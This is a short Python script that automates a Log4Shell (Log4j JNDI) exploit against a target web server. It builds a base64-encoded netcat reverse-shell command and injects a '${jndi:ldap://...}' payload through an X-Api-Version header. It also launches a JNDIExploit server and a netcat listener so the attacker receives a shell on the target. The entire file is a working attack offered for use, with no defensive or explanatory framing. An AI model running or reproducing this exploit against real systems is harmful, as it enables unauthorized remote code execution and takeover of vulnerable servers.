#!/usr/bin/python3

import argparse
import os
import requests
import subprocess
import sys
import time

def main(args):
    ## Verify xterm is available and in the path
    if os.system('which xterm') == 0:

        ## Create the base64
        b64 = subprocess.check_output('echo "/usr/bin/nc {0} {1} -e /bin/sh" | base64'.format(args.nip, args.npt), shell = True).decode().strip()
        headers = {'X-Api-Version': f"${{jndi:ldap://{args.lip}:{args.lpt}/Basic/Command/Base64/{b64}}}"}

        ## Launch the servers
        if args.hip == args.lip:
            print ('xterm -e "java -jar ./JNDIExploit-1.2-SNAPSHOT.jar -i {0} -p {1}"'.format(args.hip, args.hpt))
            os.system('xterm -e "java -jar ./JNDIExploit-1.2-SNAPSHOT.jar -i {0} -p {1}" &'.format(args.hip, args.hpt))
            print('Sleeping 1 second to give xterm enough time to launch and run')
            time.sleep(1)

        ## Launch the listener
        os.system('xterm -e "nc -lvp {0}" &'.format(args.npt))
        print('Sleeping 2 seconds to give xterm enough time to launch and run')
        time.sleep(2)

        ## Connect to the listener
        try:
            response = requests.get(f"http://{args.tip}:{args.tpt}", headers=headers)
            if response.status_code == 200:
                print('Got the 200, popping shell')
        except Exception as E:
            print(E)
    else:
        print('xterm should be installed and in the $PATH for this to run')

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--hip', help = 'HTTP IP', required = True)
    parser.add_argument('--hpt', help = 'HTTP port', required = True)
    parser.add_argument('--lip', help = 'LDAP IP', required = True)
    parser.add_argument('--lpt', help = 'LDAP port', required = True)
    parser.add_argument('--nip', help = 'Netcat IP', required = True)
    parser.add_argument('--npt', help = 'Netcat port', required = True)
    parser.add_argument('--tip', help = 'Target IP', required = True)
    parser.add_argument('--tpt', help = 'Target port', required = True)
    args = parser.parse_args()
    main(args)
